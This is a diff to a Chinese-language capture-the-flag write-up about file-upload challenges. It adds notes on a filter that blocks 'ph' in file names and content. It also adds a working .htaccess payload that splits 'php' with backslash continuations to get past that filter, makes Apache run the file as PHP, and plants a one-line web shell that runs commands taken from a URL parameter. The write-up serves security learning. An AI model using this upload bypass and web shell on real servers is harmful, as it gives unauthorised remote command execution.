@@ -35,8 +35,24 @@ zip --symlink test.zip index.html
 ```
 
 ### Gist
+過濾條件
+ - 檔名包含ph
+ - 內容包含ph
+ - 檔案大小大於 0x100
 
-
+上傳.htaccess,把.htaccess當成php來執行
+```
+<FilesMatch .htaccess>
+SetHandler application/x-httpd-p\
+hp
+Require all granted
+p\
+hp_flag engine on
+</FilesMatch>
+p\
+hp_value auto_prepend_file .htaccess
+#<?=`$_GET[1]`?>
+```
 ## 小節
 再接再勵ㄅQQ
 ![](https://i.imgur.com/Yqnd2ce.png)
